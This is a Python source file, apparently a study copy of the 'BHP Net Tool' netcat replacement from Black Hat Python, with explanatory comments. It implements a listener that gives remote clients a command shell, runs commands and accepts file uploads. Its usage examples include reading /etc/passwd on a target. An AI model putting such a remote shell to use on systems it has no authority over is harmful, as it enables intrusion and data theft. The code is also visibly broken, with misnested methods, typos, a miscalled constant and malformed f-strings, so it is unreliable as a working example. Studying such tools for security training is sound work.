#Replacing netcat 

#This is useful when you are having python installed on the target server but "netcat" or "nc.exe" is not installed.

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
	cmd = cmd.strip()
	if not cmd:
		return
	output = subprocess.check_output(shlex.split(cmd),stderr = subprocess.STDOUT())
	# subprocess.check_output runs a command on the local OS and returns the output from that command.

	#shlex.split(cmd) is going to split the provided user command into shell like syntax for example ->
	'''
	If the user has provided command "ls \"My Documents\" --verbose" 
	Then shlex.split(cmd) will convert it to ['ls', 'My Documents', '--verbose']

	subprocess.STDOUT() is a special value that can be used as the stderr argument to "Popen" and indicates that standard error should go into the same handle as standard output.
'''
	return output.decode()

if __name__ == '__main__':
	# argparser.ArgumentParser is a container for argument specifications and has options that apply to the parser as whole

	parser = argparse.ArgumentParser(
		description = 'BHP Net Tool',
		formatter_class = argparse.RawDescriptionHelpFormatter,
		epilog = textwrap.dedent('''Example:
			netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
			netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
			netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
			echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server on port 135
			netcat.py -t 192.168.83.128 -p 1234 # connect to server '''
			)
		)
	# epilog: Some programs like to display additional description of the program after the description of the arguments. Such text can be specified using the epilog= argument to ArgumentParser
	parser.add_argument('-c', '--command',action='store_true', help='command shell')
	parser.add_argument('-e', '--execute', help='execute specified command')
	parser.add_argument('-l', '--listen', action='store_true', help='listen')
	parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
	parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
	parser.add_argument('-u', '--upload', help='upload file')

	#The ArgumentParser.add_argument() method attaches individual argument specifications to the parser. It supports positional arguments, options that accept values, and on/off flags

	args = parser.parse_args() 
	'''
	Here parser = argparse.ArgumentParser() method which is equals to 'args', this runs the parser and places the extracted data into argparse.Namespace object
	'''
	if args.listen:
		buffer = ''
	else:
		buffer = sys.stdin.read()
	nc = NetCat(args, buffer.encode())
	nc.run()
	'''
	If we’re setting it up as a listener, we invoke the NetCat object
	with an empty buffer string. Otherwise, we send the buffer content
	from stdin. Finally, we call the run method to start it up.
	'''

class NetCat:
	def __init__(self,args,buffer=None):
		self.args = args
		self.buffer = buffer
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		def run(self):
			if self.args.listen:
				self.listen()
			else:
				self.send()
		def send(self):
			self.socket.connect((self.args.target,self.args.port))
			if self.buffer:
				self.socket.send(self.buffer)
			try:
				while True:
					recv_len = 1
					response = ''
					while recv_len:
						data = self.socket.recv(4096)
						recv_len = len(data)
						response += data.decode()
						if recv_len < 4096:
							break
					if response:
						print(response)
						buffer = input('>')
						buffer += '\n'
						self.socket.send(buffer.encode())
			except KeyboardInterrupt:
				print('User terminated.')
				self.socket.close()
				sys.exit()
		# LISTENER 
		def listener(self):
			self.socket.bind((self.args.target, self.args.port))
			self.socket.listen(5)
			while True:
				client.socket, _ = self.socket.accept()
				client_thread = threading.Thread(target = self.handle, args=(client_socket,))
				client_thread.start()
		def handle(self, client_socket):
			if self.args.execute:
				output = execute(self.args.execute)
				client_socket.send(output.encode())
			elif self.args.upload:
				file_buffer = b''
				while True:
					data = client_socket.recv(4096)
					if data:
						file_buffer += data
					else:
						break
				with open(self.args.upload, 'wb') as f:
					f.write(file_buffer)
					message = f'Saved file (self.args.upload)'
					client_socket.send(message.encode())
			elif self.args.command:
				cmd_buffer = b''
				while True:
					try:
						client_socket.send(b'BHP: #> ')
						while '\n' not in cmd_buffer.decode():
							cmd_buffer += client_socket.recv(64)
						response = execute(cmd_buffer.decode())
						if respnse:
							client_socket.send(response.decode())
						cmd_buffer = b''
					except Exception as e:
						print(f'Server Killed (e)')
						self.socket.close()
						sys.exit()











